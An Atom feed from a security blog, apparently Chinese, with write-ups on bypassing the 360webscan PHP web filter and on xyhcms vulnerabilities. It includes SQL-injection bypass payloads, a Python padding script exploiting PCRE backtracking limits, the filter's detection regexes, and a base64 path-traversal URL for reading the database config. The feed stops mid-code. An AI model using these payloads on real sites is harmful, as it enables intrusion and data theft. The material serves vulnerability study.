<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h3art3ars</title>
  
  <subtitle>路漫漫其修远兮，吾将上下而求索</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://h3art3ars.github.io/"/>
  <updated>2020-02-17T05:46:53.491Z</updated>
  <id>http://h3art3ars.github.io/</id>
  
  <author>
    <name>h3art3ars</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>360webscan bypass</title>
    <link href="http://h3art3ars.github.io/2020/02/17/360webscan-bypass/"/>
    <id>http://h3art3ars.github.io/2020/02/17/360webscan-bypass/</id>
    <published>2020-02-17T05:39:48.000Z</published>
    <updated>2020-02-17T05:46:53.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>将360safe文件夹放入网站根目录，在入口文件或者需要过滤的文件使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select *  from tab where id &#x3D;&quot;.$_POST[&#39;id&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">echo $sql;</span></pre></td></tr></table></figure><h2 id="php-self白名单绕过"><a href="#php-self白名单绕过" class="headerlink" title="php_self白名单绕过"></a>php_self白名单绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_directory&#x3D;&#39;admin|\&#x2F;dede\&#x2F;|\&#x2F;install\&#x2F;&#39;;</span></pre></td></tr></table></figure><p><code>php_self</code>中含有 <code>admin</code>或者 <code>/dede/</code> 或者 <code>/install/</code>时，不过滤字符</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>传参 <code>id=select * from aaa</code>拦截</p><p><img src="/images/360webscan1.png" alt=""></p><p>在urlpath之后添加 <code>/admin</code> ,<code>/dede/</code> ,<code>/install/</code>之后不拦截</p><p><img src="/images/360webscan2.png" alt=""></p><h2 id="white-url白名单绕过"><a href="#white-url白名单绕过" class="headerlink" title="white_url白名单绕过"></a>white_url白名单绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_url &#x3D; array(&#39;index.php&#39; &#x3D;&gt; &#39;m&#x3D;admin&#39;,&#39;post.php&#39; &#x3D;&gt; &#39;job&#x3D;postnew&amp;step&#x3D;post&#39;,&#39;edit_space_info.php&#39;&#x3D;&gt;&#39;&#39;);</span></pre></td></tr></table></figure><p><code>index.php?m=admin</code>, <code>post.php?job=postnew&amp;step=post</code>  , <code>edit_apace_info.php</code>不过滤</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/images/360webscan3.png" alt=""></p><p><img src="/images/360webscan5.png" alt=""></p><p><img src="/images/360webscan6.png" alt=""></p><p>这两个白名单的方法很容易会被使用的人给更改掉</p><h2 id="超长字符串绕过正则"><a href="#超长字符串绕过正则" class="headerlink" title="超长字符串绕过正则"></a>超长字符串绕过正则</h2><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;get拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$getfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|^\\+\\&#x2F;v(8|9)|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;post拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$postfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$cookiefilter &#x3D; &quot;\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr></table></figure><p>是正则表达式设置规则，因此可利用<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">def exp():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    domain &#x3D; &#39;http:&#x2F;&#x2F;debug.com&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    path &#x3D; &#39;&#x2F;test.php&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain + path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    headers &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    # payload &#x3D; &quot;select *&#x2F;*&quot;+&#39;a&#39;*1000000+&#39;*&#x2F; from aaa&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &quot;select * from aaa&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;&quot;id&quot;: payload&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain+path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(url&#x3D;url, data&#x3D;data, headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    if &#39;webscan&#39;in res.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        print(&quot;fobidden!\n&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    print(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    exp()</span></pre></td></tr></table></figure><p>当直接传参时候,显示拦截了</p><p><img src="/images/360webscan7.png" alt=""></p><p>当填充<code>payload</code>即<code>id</code>参数中1000000个a时</p><p><img src="/images/360webscan8.png" alt=""></p><h2 id="插入绕过正则"><a href="#插入绕过正则" class="headerlink" title="插入绕过正则"></a>插入绕过正则</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">INSERT\\s+INTO.+?VALUES</span></pre></td></tr></table></figure><p>insert 数据可以用另几种方式</p><ol><li><code>insert into table set name = &#39;admin&#39;,pass = &#39;123456&#39;</code></li><li><code>insert table(name,password) values(&#39;admin&#39;,&#39;123456&#39;)</code></li><li><code>insert into table(name,password) select &#39;admin&#39;,&#39;123456&#39;</code></li></ol><p>这几种写法可以随意组合着用</p><p>可用性测试：</p><p><img src="/images/360webscan12.png" alt=""></p><p>绕过测试</p><p><img src="/images/360webscan9.png" alt=""></p><p><img src="/images/360webscan10.png" alt=""></p><p><img src="/images/360webscan11.png" alt=""></p><p>另外，还可以用 <code>replace into</code>来代替<code>insert</code>与<code>update</code>，而且<code>replace into</code>也有和<code>insert into</code>一样的三种写法加上一种普通写法都可以绕过。</p><h2 id="老版本绕过"><a href="#老版本绕过" class="headerlink" title="老版本绕过"></a>老版本绕过</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p> WEBSCAN_VERSION：0.1.3.2 </p><p>先在使用了360通防的页面上发送<code>?id=union select ’1,2,3&#39;</code>若是拦截，再发送<code>id = union select!1,2,3</code>不拦截，则可以union绕过。</p><p>可使用</p><ol><li><code>union select!1,user(),3</code></li><li><code>union select@1,user(),3</code></li></ol><p>若是数据库编码不是utf-8则可以使用%a0隔绝select与from造成绕过。（编码问题不懂）</p><p><code>select%a0*%a0from%20tables</code></p>]]></content>
    
    <summary type="html">
    
      绕过360webscan通防的方法
    
    </summary>
    
    
      <category term="waf" scheme="http://h3art3ars.github.io/categories/waf/"/>
    
    
      <category term="waf" scheme="http://h3art3ars.github.io/tags/waf/"/>
    
      <category term="bypass" scheme="http://h3art3ars.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>xyhcms漏洞整理</title>
    <link href="http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <id>http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</id>
    <published>2020-01-27T07:35:37.000Z</published>
    <updated>2020-01-27T07:44:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h2><ul><li>v3.5</li><li>v3.6</li><li>v2</li></ul><h3 id="任意文件读取（后台）"><a href="#任意文件读取（后台）" class="headerlink" title="任意文件读取（后台）"></a>任意文件读取（后台）</h3><ul><li><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/App/Manage/Controller/TempletsController.class.php 第59-83行：</p></li><li><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>没有对传入的fname参数进行过滤</p></li><li><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function edit() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$ftype &#x3D; I(&#39;ftype&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; I(&#39;fname&#39;, &#39;&#39;, &#39;trim,htmlspecialchars&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$file_path &#x3D; !$ftype ? &#39;.&#x2F;Public&#x2F;Home&#x2F;&#39; . C(&#39;CFG_THEMESTYLE&#39;) . &#39;&#x2F;&#39; : &#39;.&#x2F;Public&#x2F;Mobile&#x2F;&#39; . C(&#39;CFG_MOBILE_THEMESTYLE&#39;) . &#39;&#x2F;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;未指定文件名&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$_ext &#x3D; &#39;.&#39; . pathinfo($fname, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$_cfg_ext &#x3D; C(&#39;TMPL_TEMPLATE_SUFFIX&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">if ($_ext !&#x3D; $_cfg_ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件后缀必须为&quot;&#39; . $_cfg_ext . &#39;&quot;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; I(&#39;content&#39;, &#39;&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; ltrim($fname, &#39;.&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">if (stripos($content, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;模板内容禁止包含php代码！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; file_put_contents($truefile, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">$this-&gt;success(&#39;保存成功&#39;, U(&#39;index&#39;, array(&#39;ftype&#39; &#x3D;&gt; $ftype)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;保存文件失败，请重试&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; base64_decode($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">var_dump($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;未指定要编辑的文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">if (!file_exists($truefile)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件不存在&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; file_get_contents($truefile);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">if ($content &#x3D;&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;读取文件失败&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; htmlspecialchars($content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;ftype&#39;, $ftype);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;fname&#39;, $fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;content&#39;, $content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;type&#39;, &#39;修改模板&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">$this-&gt;display();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>数据库配置文件路径：<code>\App\Common\Conf\db.php</code> </li><li>组成相对路径 <code>..\\..\\..\\App\\Common\\Conf\\db.php</code></li><li>base64编码，<code>Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li><li>最后构造的链接形式如下：<code>http://127.0.0.1/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li></ol></li><li><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>下载v3.5，发现代码已经做了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><h3 id="文件写入导致代码执行漏洞（后台）"><a href="#文件写入导致代码执行漏洞（后台）" class="headerlink" title="文件写入导致代码执行漏洞（后台）"></a>文件写入导致代码执行漏洞（后台）</h3><ul><li><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p></li><li><h4 id="漏洞原因-1"><a href="#漏洞原因-1" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对写入文件的内容过滤不严</p></li><li><h4 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function site() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data &#x3D; I(&#39;config&#39;, array(), &#39;trim&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">foreach ($data as $key &#x3D;&gt; $val) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">if (stripos($val, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;\?php(.+?)\?&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">if (stripos($val, &#39;&lt;script&#39;) !&#x3D;&#x3D; false &amp;&amp; stripos($val, &#39;php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">if (stripos($data[$key], &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $data[$key])) &#123;</span></pre></td></tr><tr><td 